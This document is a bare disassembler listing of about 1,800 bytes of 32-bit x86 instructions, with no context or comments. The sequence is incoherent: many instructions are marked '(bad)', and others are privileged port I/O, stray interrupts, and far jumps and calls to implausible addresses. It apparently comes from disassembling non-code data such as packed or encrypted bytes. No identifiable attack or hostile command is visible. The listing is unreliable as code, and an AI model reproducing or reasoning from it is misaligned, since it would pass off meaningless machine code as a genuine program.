  41d54d:	cmp    DWORD PTR ds:[edi+0x637883a0],esi
  41d554:	loope  0x41d4da
  41d556:	sbb    al,0x6
  41d558:	lea    ebx,[eax+0xcaa3d68]
  41d55e:	xchg   ebp,eax
  41d55f:	sub    al,0x7
  41d561:	or     eax,0x9c6d9c34
  41d566:	test   BYTE PTR [eax-0x3ddbdfd8],ch
  41d56c:	adc    al,0x8
  41d56e:	int    0xd6
  41d570:	daa    
  41d571:	popf   
  41d572:	jp     0x41d5ae
  41d574:	jno    0x41d56c
  41d576:	std    
  41d577:	xchg   ebx,eax
  41d578:	retf   0xf420
  41d57b:	mov    bh,0x7f
  41d57d:	in     eax,0x93
  41d57f:	sub    eax,0x6a601048
  41d584:	mov    eax,0x49d2f5e4
  41d589:	mov    ds:0xbb61dbc9,eax
  41d58e:	add    al,0xb2
  41d590:	repnz inc esi
  41d592:	pop    es
  41d593:	xor    edx,DWORD PTR [eax+0x942319c]
  41d599:	(bad)  
  41d59a:	mov    al,0x77
  41d59c:	mov    al,0x30
  41d59e:	cmp    edx,edi
  41d5a0:	jns    0x41d58d
  41d5a2:	xor    ch,bl
  41d5a4:	fcmovnb st,st(3)
  41d5a6:	push   ebx
  41d5a7:	cld    
  41d5a8:	mov    ecx,0x2455c81f
  41d5ad:	cmp    DWORD PTR [esi+0x2e],0xffffffad
  41d5b1:	aaa    
  41d5b2:	sbb    edx,DWORD PTR [ecx+0xa]
  41d5b5:	aas    
  41d5b6:	in     eax,dx
  41d5b7:	mov    WORD PTR [ecx],es
  41d5b9:	mov    esi,0x6a1495
  41d5be:	push   esi
  41d5bf:	add    eax,0xf627592a
  41d5c4:	xchg   ebp,eax
  41d5c5:	out    dx,al
  41d5c6:	stos   DWORD PTR es:[edi],eax
  41d5c7:	shr    DWORD PTR [ebx+ebx*4-0x2f178861],1
  41d5ce:	xlat   BYTE PTR ds:[ebx]
  41d5cf:	lods   eax,DWORD PTR ds:[esi]
  41d5d0:	adc    bl,ch
  41d5d2:	sub    eax,0xd4d610b7
  41d5d7:	scas   al,BYTE PTR es:[edi]
  41d5d8:	and    ecx,DWORD PTR ds:0xe1ba130f
  41d5de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d5df:	jmp    0x41d5c4
  41d5e1:	popa   
  41d5e2:	xchg   DWORD PTR fs:[edi-0x78a77d2a],edx
  41d5e9:	pop    es
  41d5ea:	repnz adc ebx,DWORD PTR [ecx]
  41d5ed:	dec    ebp
  41d5ee:	adc    eax,0xc16abb83
  41d5f3:	fstp   TBYTE PTR [edx]
  41d5f5:	inc    ecx
  41d5f6:	cmp    eax,0xdbbe95c6
  41d5fb:	mov    esi,0xbda3e122
  41d600:	sbb    DWORD PTR ds:0x42733fb4,esi
  41d606:	test   DWORD PTR [esi],esp
  41d608:	ins    DWORD PTR es:[edi],dx
  41d609:	lea    edi,[edi]
  41d60b:	push   ss
  41d60c:	or     ebp,esi
  41d60e:	sbb    dh,0xa2
  41d611:	xchg   edx,eax
  41d612:	jecxz  0x41d5fb
  41d614:	xchg   edi,eax
  41d615:	into   
  41d616:	dec    esp
  41d617:	xchg   esi,eax
  41d618:	or     esp,esp
  41d61a:	outs   dx,BYTE PTR ds:[esi]
  41d61b:	outs   dx,BYTE PTR ds:[esi]
  41d61c:	inc    ecx
  41d61d:	sbb    BYTE PTR [eax+0x47],0x72
  41d621:	cmp    eax,0x6494c004
  41d626:	add    DWORD PTR [esi-0x35],esp
  41d629:	cs in  al,0x4f
  41d62c:	and    eax,0x5c8e7271
  41d631:	push   ds
  41d632:	aam    0xb5
  41d634:	adc    DWORD PTR [eax+0x7f],0xc8fcfb5c
  41d63b:	sub    al,0xd5
  41d63d:	and    bl,cl
  41d63f:	cmp    esi,DWORD PTR [ebp-0x50]
  41d642:	(bad)  
  41d643:	sub    BYTE PTR [ecx-0x51723b4f],ah
  41d649:	cmp    al,0xf1
  41d64b:	xchg   ecx,edi
  41d64d:	and    DWORD PTR [edx],edi
  41d64f:	adc    cl,0xd8
  41d652:	pop    esi
  41d653:	pop    ebp
  41d654:	add    ebp,DWORD PTR [ebx+0x30850703]
  41d65a:	sbb    BYTE PTR [esi],al
  41d65c:	mov    bh,0x7c
  41d65e:	push   edi
  41d65f:	jo     0x41d5e4
  41d661:	int3   
  41d662:	push   ds
  41d663:	add    al,0xb4
  41d665:	arpl   sp,si
  41d667:	mov    BYTE PTR [eax+0x1f],bl
  41d66a:	pop    edx
  41d66b:	jge    0x41d67e
  41d66d:	adc    eax,DWORD PTR [esp+ebp*2-0x3c39da83]
  41d674:	or     BYTE PTR [ebx-0x4a],dl
  41d677:	outs   dx,BYTE PTR ds:[esi]
  41d678:	pop    esi
  41d679:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d67a:	jnp    0x41d6c6
  41d67c:	add    eax,0xcbced601
  41d681:	outs   dx,DWORD PTR ds:[esi]
  41d682:	xor    esi,eax
  41d684:	mov    dh,0x5c
  41d686:	stos   DWORD PTR es:[edi],eax
  41d687:	push   ss
  41d688:	mov    ah,0x9a
  41d68a:	fnsave [edx+0x121ba3a5]
  41d690:	xchg   DWORD PTR [ebx],ecx
  41d692:	aas    
  41d693:	int3   
  41d694:	mov    cl,bl
  41d696:	push   cs
  41d697:	add    DWORD PTR [edx-0x3e9112e7],esp
  41d69d:	xchg   dl,ch
  41d69f:	(bad)  
  41d6a1:	aam    0xfd
  41d6a3:	test   DWORD PTR [edi],eax
  41d6a5:	stos   BYTE PTR es:[edi],al
  41d6a6:	adc    BYTE PTR [edi-0x3d],0x8b
  41d6aa:	cmp    DWORD PTR [esi],ecx
  41d6ac:	and    ch,ah
  41d6ae:	or     dl,BYTE PTR [ebx+0x70142fca]
  41d6b4:	mov    ebx,0x4940f697
  41d6b9:	minps  xmm7,xmm7
  41d6bc:	stos   BYTE PTR es:[edi],al
  41d6bd:	(bad)  
  41d6be:	push   0xa5b00f7a
  41d6c3:	jno    0x41d6d3
  41d6c5:	sbb    eax,0x1ed95f58
  41d6ca:	shr    bl,0xa9
  41d6cd:	out    0x21,eax
  41d6cf:	or     BYTE PTR [edi+0x3529f771],bh
  41d6d5:	ins    DWORD PTR es:[edi],dx
  41d6d6:	pop    ebp
  41d6d7:	sti    
  41d6d8:	xor    cl,al
  41d6da:	mov    ecx,0xeac143e8
  41d6df:	mov    dl,0xe
  41d6e1:	cmp    BYTE PTR [ecx+0x1c],dl
  41d6e4:	sahf   
  41d6e5:	add    BYTE PTR [esi+0x2adf3e76],cl
  41d6eb:	je     0x41d69a
  41d6ed:	test   DWORD PTR [ecx-0x43],esp
  41d6f0:	push   ss
  41d6f1:	inc    esp
  41d6f2:	stos   BYTE PTR es:[edi],al
  41d6f3:	pushf  
  41d6f4:	rep ins DWORD PTR es:[edi],dx
  41d6f6:	call   0x621c:0x4118bc92
  41d6fd:	xor    dh,bl
  41d6ff:	in     eax,0x1c
  41d701:	icebp  
  41d702:	mov    ah,0xca
  41d704:	and    eax,0x8a33a868
  41d709:	ss xchg esi,eax
  41d70b:	sti    
  41d70c:	ret    
  41d70d:	mov    esp,0x2e59f4c7
  41d712:	in     al,dx
  41d713:	adc    DWORD PTR [ecx+ecx*8],esi
  41d716:	fwait
  41d717:	into   
  41d718:	or     ah,BYTE PTR [edx]
  41d71a:	stos   DWORD PTR es:[edi],eax
  41d71b:	ficom  WORD PTR [esi-0x80]
  41d71e:	jmp    0x41d72a
  41d720:	mov    edx,0x9bb3da6e
  41d725:	xchg   edi,eax
  41d726:	stc    
  41d727:	sbb    ecx,esp
  41d729:	add    bh,al
  41d72b:	sahf   
  41d72c:	scas   al,BYTE PTR es:[edi]
  41d72d:	aad    0x92
  41d72f:	jge    0x41d70a
  41d731:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d732:	pop    ss
  41d733:	aad    0xbf
  41d735:	loopne 0x41d70c
  41d737:	neg    BYTE PTR [esi+0x79a69807]
  41d73d:	and    edi,DWORD PTR [edi]
  41d73f:	pop    es
  41d740:	mov    ebp,0x9a7817b7
  41d745:	scas   eax,DWORD PTR es:[edi]
  41d746:	dec    ebp
  41d747:	jae    0x41d6f7
  41d749:	cmp    eax,0xeb7d1b3c
  41d74e:	test   eax,0x262dee42
  41d753:	bound  ecx,QWORD PTR [edi]
  41d755:	and    edx,DWORD PTR [esi+edx*2]
  41d758:	leave  
  41d759:	cmp    ebp,DWORD PTR [edi+0x5e1052fd]
  41d75f:	popf   
  41d760:	add    DWORD PTR [esi+0x3156edbe],0x128a1caa
  41d76a:	mov    fs,WORD PTR [ebp-0x14eeb332]
  41d770:	neg    DWORD PTR [ebp-0x6be7bd0f]
  41d776:	inc    ecx
  41d777:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d778:	ins    BYTE PTR es:[edi],dx
  41d779:	xchg   ebx,eax
  41d77a:	arpl   WORD PTR [edi-0x3e4329db],cx
  41d780:	mov    ds:0xeee81495,al
  41d785:	pushf  
  41d786:	dec    esp
  41d787:	add    edi,ebx
  41d789:	jge    0x41d749
  41d78b:	aam    0xa7
  41d78d:	jmp    0x41d71d
  41d78f:	jbe    0x41d77a
  41d791:	push   ebx
  41d792:	mov    dx,0x84c7
  41d796:	or     DWORD PTR es:[ebx],esi
  41d799:	mov    esi,0xf3449281
  41d79e:	xchg   edi,eax
  41d79f:	std    
  41d7a0:	cs cmp dh,dl
  41d7a3:	icebp  
  41d7a4:	xchg   edi,eax
  41d7a5:	(bad)  
  41d7a6:	xchg   al,bh
  41d7a8:	les    esp,FWORD PTR [edi+0x413adf7b]
  41d7ae:	iret   
  41d7af:	mov    cl,ch
  41d7b1:	sub    ch,BYTE PTR [eax-0x7a]
  41d7b4:	int    0x8c
  41d7b6:	dec    esp
  41d7b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d7b8:	ins    DWORD PTR es:[edi],dx
  41d7b9:	dec    ebp
  41d7ba:	inc    ebx
  41d7bb:	lods   al,BYTE PTR ds:[esi]
  41d7bc:	dec    esi
  41d7bd:	add    esp,DWORD PTR [ebp-0x7e]
  41d7c0:	les    ebx,FWORD PTR [esi-0x60a69af1]
  41d7c6:	rcl    DWORD PTR [esi],cl
  41d7c8:	sub    dh,ah
  41d7ca:	push   edi
  41d7cb:	clc    
  41d7cc:	scas   al,BYTE PTR es:[edi]
  41d7cd:	xor    al,0xf2
  41d7cf:	adc    ebp,DWORD PTR [esi-0x3e]
  41d7d2:	or     DWORD PTR [ebx],esi
  41d7d4:	add    esp,DWORD PTR [edi-0x68e47ee]
  41d7da:	popf   
  41d7db:	pop    esp
  41d7dc:	out    0x7d,eax
  41d7de:	popf   
  41d7df:	ja     0x41d7bd
  41d7e1:	adc    BYTE PTR [ecx+0x47],0xc9
  41d7e5:	fdiv   QWORD PTR [esp+ecx*4-0x5b]
  41d7e9:	outs   dx,BYTE PTR ds:[esi]
  41d7ea:	push   DWORD PTR [eax+0x3a]
  41d7ed:	dec    edi
  41d7ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d7ef:	aaa    
  41d7f0:	(bad)  
  41d7f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d7f2:	adc    al,0x4c
  41d7f4:	aam    0x98
  41d7f6:	cwde   
  41d7f7:	leave  
  41d7f8:	jno    0x41d830
  41d7fa:	into   
  41d7fb:	daa    
  41d7fc:	adc    bh,BYTE PTR [ebx+edi*2-0x7da33659]
  41d803:	aaa    
  41d804:	dec    edx
  41d805:	enter  0xfa55,0x40
  41d809:	add    DWORD PTR [edi],edi
  41d80b:	mov    ds:0xc68a0c9f,eax
  41d810:	sbb    BYTE PTR [edx],ch
  41d812:	jle    0x41d84d
  41d814:	aam    0x81
  41d816:	xchg   ebp,edi
  41d818:	cld    
  41d819:	jbe    0x41d84f
  41d81b:	lea    ebx,[edi]
  41d81d:	pop    esp
  41d81e:	repz rcl esp,cl
  41d821:	sbb    esi,ecx
  41d823:	mov    dl,dl
  41d825:	aaa    
  41d826:	xchg   ebp,eax
  41d827:	or     bh,BYTE PTR [ebp-0x3b]
  41d82a:	test   edx,0x9a52d5d1
  41d830:	inc    ebx
  41d831:	(bad)  
  41d833:	pop    edi
  41d834:	(bad)  
  41d835:	pop    ss
  41d836:	jns    0x41d829
  41d838:	jg     0x41d87d
  41d83a:	rcl    BYTE PTR [esi],1
  41d83c:	push   cs
  41d83d:	aaa    
  41d83e:	stos   DWORD PTR es:[edi],eax
  41d83f:	leave  
  41d840:	popa   
  41d841:	out    dx,eax
  41d842:	mov    ?,WORD PTR [ebx-0x26]
  41d845:	pop    es
  41d846:	dec    eax
  41d847:	add    al,0x46
  41d849:	jo     0x41d825
  41d84b:	xchg   esi,eax
  41d84c:	outs   dx,BYTE PTR ds:[esi]
  41d84d:	sbb    eax,DWORD PTR [esi-0x66]
  41d850:	add    al,0x56
  41d852:	inc    ecx
  41d853:	rcl    esi,0xee
  41d856:	xor    cl,BYTE PTR [ebp-0x7886f31f]
  41d85c:	cmp    BYTE PTR [edx-0x70],bl
  41d85f:	div    DWORD PTR [ebx-0x73]
  41d862:	sar    ah,1
  41d864:	push   ebx
  41d865:	dec    esp
  41d866:	test   eax,0xc397cc55
  41d86b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d86c:	inc    ebx
  41d86d:	neg    DWORD PTR [ecx+0x6d]
  41d870:	jae    0x41d8a1
  41d872:	std    
  41d873:	aas    
  41d874:	sub    al,0x47
  41d876:	xchg   DWORD PTR [edx],esp
  41d878:	test   eax,0x1f37f602
  41d87d:	pop    edx
  41d87e:	stc    
  41d87f:	pop    ds
  41d880:	push   ss
  41d881:	or     ebx,DWORD PTR [edi+0x6e]
  41d884:	jecxz  0x41d80c
  41d886:	adc    eax,0xe33accf6
  41d88b:	js     0x41d8b9
  41d88d:	adc    bl,al
  41d88f:	retf   0x83b8
  41d892:	adc    al,0xc7
  41d894:	mov    eax,ds:0x44ede3fc
  41d899:	jnp    0x41d89e
  41d89b:	leave  
  41d89c:	dec    ebx
  41d89d:	adc    BYTE PTR [ebp-0x3f],ch
  41d8a0:	and    eax,0x826838a2
  41d8a5:	mov    ds:0x24b3a2ea,al
  41d8aa:	arpl   WORD PTR [eax+0x64],bx
  41d8ad:	jg     0x41d832
  41d8af:	dec    edx
  41d8b0:	adc    eax,0xdeb4c61
  41d8b5:	push   0xffffff8b
  41d8b7:	jns    0x41d84c
  41d8b9:	dec    esp
  41d8ba:	and    BYTE PTR [ecx],dl
  41d8bc:	xor    ch,BYTE PTR [ebp-0x71f19cee]
  41d8c2:	lods   eax,DWORD PTR ds:[esi]
  41d8c3:	je     0x41d8cb
  41d8c5:	xchg   ecx,eax
  41d8c6:	xchg   esi,eax
  41d8c7:	bound  edi,QWORD PTR [edi+0x26]
  41d8ca:	cmp    bl,BYTE PTR [edi+0x55]
  41d8cd:	pop    es
  41d8ce:	push   edx
  41d8cf:	dec    edi
  41d8d0:	sti    
  41d8d1:	shl    BYTE PTR [ebx+0xae9237a],0x2d
  41d8d8:	jno    0x41d8c5
  41d8da:	ret    0xb669
  41d8dd:	mov    dl,0x65
  41d8df:	in     al,0xe5
  41d8e1:	clc    
  41d8e2:	int3   
  41d8e3:	iret   
  41d8e4:	add    eax,0x12ba0418
  41d8e9:	sbb    ah,BYTE PTR [ebp-0x6]
  41d8ec:	out    0x2e,al
  41d8ee:	push   edx
  41d8ef:	fidivr DWORD PTR [ecx+0x60]
  41d8f2:	adc    BYTE PTR [eax-0x27],ah
  41d8f5:	ins    BYTE PTR es:[edi],dx
  41d8f6:	bound  ebx,QWORD PTR [edi+esi*1-0x6ef9edbf]
  41d8fd:	shr    BYTE PTR [edi],1
  41d8ff:	sub    edx,DWORD PTR [esi-0x1aaf4181]
  41d905:	loop   0x41d8dd
  41d907:	add    al,0xd4
  41d909:	mov    edx,DWORD PTR [edx-0x6fc8c259]
  41d90f:	pusha  
  41d910:	ins    BYTE PTR es:[edi],dx
  41d911:	mov    eax,ds:0xae1344db
  41d916:	jno    0x41d957
  41d918:	add    eax,0x423b1e6c
  41d91d:	mov    ebp,0x555b8685
  41d922:	sbb    eax,0x9ce9b7bd
  41d927:	mov    edx,0x5c2e1e28
  41d92c:	sub    esi,ecx
  41d92e:	cmp    ch,BYTE PTR [esp+ecx*1-0x59f46b4b]
  41d935:	push   esp
  41d936:	out    0x87,al
  41d938:	cli    
  41d939:	jns    0x41d98d
  41d93b:	push   cs
  41d93c:	popf   
  41d93d:	or     dl,dh
  41d93f:	mov    dl,0xd3
  41d941:	or     bh,BYTE PTR [ecx+0x26]
  41d944:	clc    
  41d945:	dec    esp
  41d946:	aam    0xed
  41d948:	enter  0x4276,0x52
  41d94c:	les    ebx,FWORD PTR [ebp-0x14]
  41d94f:	stos   BYTE PTR es:[edi],al
  41d950:	pop    ebx
  41d951:	xchg   esp,eax
  41d952:	shl    bh,0x0
  41d955:	(bad)  [ebx]
  41d957:	add    BYTE PTR [edx],dl
  41d959:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d95a:	lock xchg edx,eax
  41d95c:	mov    ebp,0x4d66bc
  41d961:	test   DWORD PTR ds:0x55ad1025,0x68f385e8
  41d96b:	jb     0x41d9c2
  41d96d:	es mov edx,0x94200aeb
  41d973:	stc    
  41d974:	or     ebp,ecx
  41d976:	xchg   esi,eax
  41d977:	fnstsw WORD PTR [eax]
  41d979:	int    0x18
  41d97b:	inc    esp
  41d97c:	cmc    
  41d97d:	mov    ebp,0x211715d3
  41d982:	pop    ds
  41d983:	ins    DWORD PTR es:[edi],dx
  41d984:	aad    0x54
  41d986:	and    DWORD PTR [ebp+0x21],esi
  41d989:	adc    ecx,DWORD PTR [ecx]
  41d98b:	pushf  
  41d98c:	aaa    
  41d98d:	dec    ebx
  41d98e:	mov    WORD PTR [edx+0x36],cs
  41d991:	mov    ebx,0x451d4301
  41d996:	cmp    DWORD PTR [ecx],esi
  41d998:	cld    
  41d999:	shr    DWORD PTR [ebx+0x77],0xd2
  41d99d:	cs and al,0xdf
  41d9a0:	dec    ecx
  41d9a1:	cwde   
  41d9a2:	nop
  41d9a3:	dec    ebp
  41d9a4:	push   es
  41d9a5:	cs pop edi
  41d9a7:	and    edi,esi
  41d9a9:	add    al,0x85
  41d9ab:	outs   dx,BYTE PTR ds:[esi]
  41d9ac:	adc    esi,DWORD PTR [esp+eax*2+0x6fca730f]
  41d9b3:	stos   BYTE PTR es:[edi],al
  41d9b4:	fidivr WORD PTR [eax+0x16]
  41d9b7:	shr    BYTE PTR [eax+0x7b],0x54
  41d9bb:	cmp    ch,cl
  41d9bd:	and    al,0x13
  41d9bf:	jmp    0x41da18
  41d9c1:	arpl   WORD PTR [bp+si-0x3f5a],cx
  41d9c6:	xor    eax,0x38d5d5c6
  41d9cb:	mov    al,0x28
  41d9cd:	sti    
  41d9ce:	xor    esp,DWORD PTR ds:0x8ae6e2f9
  41d9d4:	inc    esp
  41d9d5:	inc    ebp
  41d9d6:	shl    BYTE PTR [ecx-0x5e38847a],cl
  41d9dc:	push   edi
  41d9dd:	adc    ebx,0x20
  41d9e0:	in     eax,0xfe
  41d9e2:	es or  BYTE PTR es:[ebp-0x36],dl
  41d9e7:	mov    BYTE PTR [ecx],al
  41d9e9:	jo     0x41d9a8
  41d9eb:	sub    ebp,DWORD PTR [esi-0x2abc2e05]
  41d9f1:	cmp    DWORD PTR [edx+0x25],esi
  41d9f4:	retf   
  41d9f5:	enter  0x61c2,0xc0
  41d9f9:	loopne 0x41d9a9
  41d9fb:	mov    ds:0x8ee1934e,al
  41da00:	dec    ecx
  41da01:	jge    0x41da78
  41da03:	out    dx,al
  41da04:	push   ds
  41da05:	add    BYTE PTR ds:0xbfc87469,al
  41da0b:	jmp    0x5f6971bf
  41da10:	adc    edx,DWORD PTR [ecx]
  41da12:	cmp    bl,0x8f
  41da15:	sub    eax,0xcfb3933f
  41da1a:	sar    DWORD PTR [ebx+0x45],0x80
  41da1e:	inc    esi
  41da1f:	inc    ebx
  41da20:	jmp    0x142736c3
  41da25:	stos   BYTE PTR es:[edi],al
  41da26:	out    0x8,al
  41da28:	retf   0x8049
  41da2b:	pop    ds
  41da2c:	pop    ecx
  41da2d:	jns    0x41da21
  41da2f:	fcomp  DWORD PTR [edx+0x6e]
  41da32:	psrad  mm0,0x87
  41da36:	mov    es,WORD PTR [eax]
  41da38:	inc    ebx
  41da39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41da3a:	sbb    BYTE PTR [edx-0x4d],dl
  41da3d:	imul   esp,DWORD PTR ds:0xe11a086f,0xffffff8c
  41da44:	and    bh,BYTE PTR [ecx]
  41da46:	outs   dx,BYTE PTR ds:[esi]
  41da47:	xchg   edi,eax
  41da48:	jmp    0x1d03:0x45994c0b
  41da4f:	(bad)  
  41da50:	cmp    DWORD PTR [eax+0x11807289],ebx
  41da56:	test   dh,dl
  41da58:	iret   
  41da59:	fist   WORD PTR cs:[ebx+0x21]
  41da5d:	pop    ss
  41da5e:	outs   dx,BYTE PTR ss:[esi]
  41da60:	xchg   ebp,eax
  41da61:	push   edx
  41da62:	cs cmp esp,0xffffffc2
  41da66:	pusha  
  41da67:	jo     0x41d9fc
  41da69:	int3   
  41da6a:	call   0xac687b71
  41da6f:	cmp    al,0xad
  41da71:	daa    
  41da72:	mov    edx,0xb7c09572
  41da77:	scas   al,BYTE PTR es:[edi]
  41da78:	lds    eax,FWORD PTR [ecx-0x6167e0e5]
  41da7e:	cmp    al,0x9f
  41da80:	cmp    edx,ecx
  41da82:	(bad)  
  41da83:	icebp  
  41da84:	pop    eax
  41da85:	push   ss
  41da86:	xor    BYTE PTR [edx+0x30],bl
  41da89:	stos   BYTE PTR es:[edi],al
  41da8a:	lods   al,BYTE PTR ds:[esi]
  41da8b:	shl    BYTE PTR [edx],1
  41da8d:	cmp    BYTE PTR [edx+0x16],cl
  41da90:	push   cs
  41da91:	pop    ebp
  41da92:	nop
  41da93:	enter  0xb70d,0xaf
  41da97:	pop    ds
  41da98:	(bad)  
  41da99:	sub    DWORD PTR [ebp+0x4d5d79c4],0xd5c40b51
  41daa3:	sbb    eax,0x2950b2e3
  41daa8:	mov    al,bl
  41daaa:	dec    esi
  41daab:	scas   al,BYTE PTR es:[edi]
  41daac:	nop
  41daad:	mov    ds:0xa0216790,al
  41dab2:	mov    dl,0xef
  41dab4:	inc    ecx
  41dab5:	dec    edi
  41dab6:	ds pop esi
  41dab8:	dec    esp
  41dab9:	mov    al,ds:0xf57cfb88
  41dabe:	mov    eax,ds:0x1a858410
  41dac3:	xchg   BYTE PTR [ebx+eiz*4-0x3a],dl
  41dac7:	fild   WORD PTR [ebp-0x31]
  41daca:	jns    0x41dade
  41dacc:	in     al,0x8e
  41dace:	out    dx,al
  41dacf:	popf   
  41dad0:	imul   ebp,DWORD PTR ds:0x30c7ee96,0xb8c19435
  41dada:	leave  
  41dadb:	inc    esi
  41dadc:	les    ecx,FWORD PTR [eax-0x40]
  41dadf:	sar    BYTE PTR [edx+0x1e],cl
  41dae2:	das    
  41dae3:	mov    ds:0xa7c96212,al
  41dae8:	xchg   ebp,eax
  41dae9:	sar    DWORD PTR [ebp+0x50],cl
  41daec:	ffreep st(6)
  41daee:	pusha  
  41daef:	sbb    al,0x12
  41daf1:	xchg   ecx,eax
  41daf2:	mov    ah,0x6d
  41daf4:	mov    edx,0x50d41899
  41daf9:	mov    al,0x48
  41dafb:	icebp  
  41dafc:	sub    BYTE PTR [ecx],bl
  41dafe:	pop    ds
  41daff:	iret   
  41db00:	adc    BYTE PTR [ecx+0x3f],cl
  41db03:	jmp    0x68dd:0xc4c30221
  41db0a:	bound  ecx,QWORD PTR [edi+0x77]
  41db0d:	and    cl,0xed
  41db10:	popa   
  41db11:	je     0x41db37
  41db13:	sbb    al,0x97
  41db15:	shr    DWORD PTR [ebp+esi*8+0x7635e79e],0x69
  41db1d:	mov    cl,0x16
  41db1f:	dec    edi
  41db20:	push   ss
  41db21:	mov    eax,ds:0x64d207a4
  41db26:	lods   eax,DWORD PTR ds:[esi]
  41db27:	not    dl
  41db29:	cmp    DWORD PTR [ecx],0x1634858d
  41db2f:	fwait
  41db30:	pop    ebx
  41db31:	pushf  
  41db32:	sahf   
  41db33:	mov    cl,0x94
  41db35:	test   DWORD PTR [edx+edi*8+0x4e3e3bcd],ebp
  41db3c:	fwait
  41db3d:	push   0xc
  41db3f:	div    BYTE PTR ds:0xa78e5b8e
  41db45:	push   cs
  41db46:	ror    edx,0x8d
  41db49:	ret    
  41db4a:	adc    BYTE PTR [ebx-0x582d0ab7],al
  41db50:	out    dx,al
  41db51:	in     al,0xb7
  41db53:	sub    ecx,DWORD PTR [eax]
  41db55:	xchg   esp,eax
  41db56:	fwait
  41db57:	cmovo  edi,DWORD PTR [ebx]
  41db5a:	xor    DWORD PTR [edx+ebx*2-0x71],0x3a5b52db
  41db62:	lds    ecx,FWORD PTR [ebp-0x75]
  41db65:	adc    bh,BYTE PTR [ebp+ebx*8+0x5b7e0521]
  41db6c:	adc    bp,WORD PTR [ecx]
  41db6f:	xor    eax,0x90073967
  41db74:	sub    al,0x88
  41db76:	add    BYTE PTR [ecx],dl
  41db78:	push   edx
  41db79:	jb     0x41db8e
  41db7b:	sbb    DWORD PTR [edi+0x4e21557d],esi
  41db81:	repz xor eax,0xc36424a3
  41db87:	int    0x23
  41db89:	daa    
  41db8a:	jmp    0x4bb33e35
  41db8f:	dec    ecx
  41db90:	jo     0x41db77
  41db92:	xlat   BYTE PTR ds:[ebx]
  41db93:	ret    
  41db94:	dec    eax
  41db95:	xchg   esi,eax
  41db96:	and    edx,ebx
  41db98:	icebp  
  41db99:	out    0x95,eax
  41db9b:	xor    edi,DWORD PTR [ecx]
  41db9d:	sub    edi,ebp
  41db9f:	sub    ch,BYTE PTR [edi-0x4b]
  41dba2:	pusha  
  41dba3:	mov    edi,0x9bd1330c
  41dba8:	mov    ds:0xd4c70518,al
  41dbad:	or     ch,bl
  41dbaf:	out    0xab,eax
  41dbb1:	hlt    
  41dbb2:	stc    
  41dbb3:	push   0xab89a87b
  41dbb8:	lods   al,BYTE PTR ds:[esi]
  41dbb9:	xor    edx,eax
  41dbbb:	push   ds
  41dbbc:	jmp    0x90006927
  41dbc1:	mov    edi,DWORD PTR [edi]
  41dbc3:	dec    edx
  41dbc4:	inc    eax
  41dbc5:	mov    ebx,DWORD PTR [edi-0x33]
  41dbc8:	push   esi
  41dbc9:	dec    edi
  41dbca:	aaa    
  41dbcb:	xor    ah,BYTE PTR [ebp+0x5620503d]
  41dbd1:	xchg   esi,eax
  41dbd2:	cli    
  41dbd3:	stc    
  41dbd4:	add    esp,DWORD PTR [eax-0x321bd256]
  41dbda:	fistp  DWORD PTR [edi]
  41dbdc:	add    dl,BYTE PTR [ebx-0x54be2ffb]
  41dbe2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dbe3:	test   BYTE PTR [esi],bh
  41dbe5:	sub    al,0x1
  41dbe7:	cmp    edi,DWORD PTR [ecx-0x5fa24ab4]
  41dbed:	sub    esi,DWORD PTR ds:0x81ad708e
  41dbf3:	sub    al,0x6f
  41dbf5:	out    0xdb,al
  41dbf7:	jo     0x41dc78
  41dbf9:	xchg   ah,bh
  41dbfb:	and    eax,0x3cde0702
  41dc00:	out    0xa7,eax
  41dc02:	ret    0xaa69
  41dc05:	call   FWORD PTR [ebx]
  41dc07:	es loop 0x41dbb1
  41dc0a:	pop    ecx
  41dc0b:	add    DWORD PTR [edi],edi
  41dc0d:	out    dx,al
  41dc0e:	in     eax,0xdd
  41dc10:	fistp  DWORD PTR [ebx-0x1582f9aa]
  41dc16:	and    BYTE PTR [edi-0x1b],bh
  41dc19:	push   esi
  41dc1a:	push   0x51defd9d
  41dc1f:	scas   eax,DWORD PTR es:[edi]
  41dc20:	cwde   
  41dc21:	xor    eax,0xa8a358da
  41dc26:	cld    
  41dc27:	push   es
  41dc28:	into   
  41dc29:	push   cs
  41dc2a:	jg     0x41dc8c
  41dc2c:	dec    esp
  41dc2d:	es je  0x41dbb3
  41dc30:	scas   eax,DWORD PTR es:[edi]
  41dc31:	fild   DWORD PTR [esi+0x7d3e9b97]
  41dc37:	mov    ds:0xfa5bc7a1,al
  41dc3c:	aaa    
  41dc3d:	pushf  
  41dc3e:	mov    esp,0x62f0638c
  41dc43:	lods   al,BYTE PTR ds:[esi]
  41dc44:	dec    edx
  41dc45:	(bad)  
  41dc46:	call   0x2925:0x1a190b99
  41dc4d:	(bad)  
  41dc4e:	adc    DWORD PTR [esi+0x53],ebp
  41dc51:	xor    cl,ch
  41dc53:	mov    DWORD PTR [ecx],ebx
  41dc55:	jmp    0x41dc2e
  41dc57:	nop
  41dc58:	xor    bh,BYTE PTR [ecx-0x4b34fa05]
  41dc5e:	ins    BYTE PTR es:[edi],dx
  41dc5f:	jno    0x41dcb5
  41dc61:	push   cs
  41dc62:	mov    cl,0xf3
  41dc64:	mov    dl,0x65
  41dc66:	cmp    al,0x94
  41dc68:	xor    DWORD PTR [ebp+0x69],eax
  41dc6b:	xor    bl,BYTE PTR [ebx]
  41dc6d:	(bad)  
  41dc6e:	push   edx
  41dc6f:	loope  0x41dcb1
  41dc71:	ficom  WORD PTR [ebx+0x4cdbc96f]
  41dc77:	adc    eax,0x3f460bef
  41dc7c:	push   esp
  41dc7d:	inc    ebx
  41dc7e:	push   DWORD PTR [ebx]
  41dc80:	pop    eax
  41dc81:	leave  
  41dc82:	cdq    
  41dc83:	push   ecx
  41dc84:	clc    
  41dc85:	in     eax,dx
  41dc86:	or     DWORD PTR [esi+0x40dc9d2d],esp
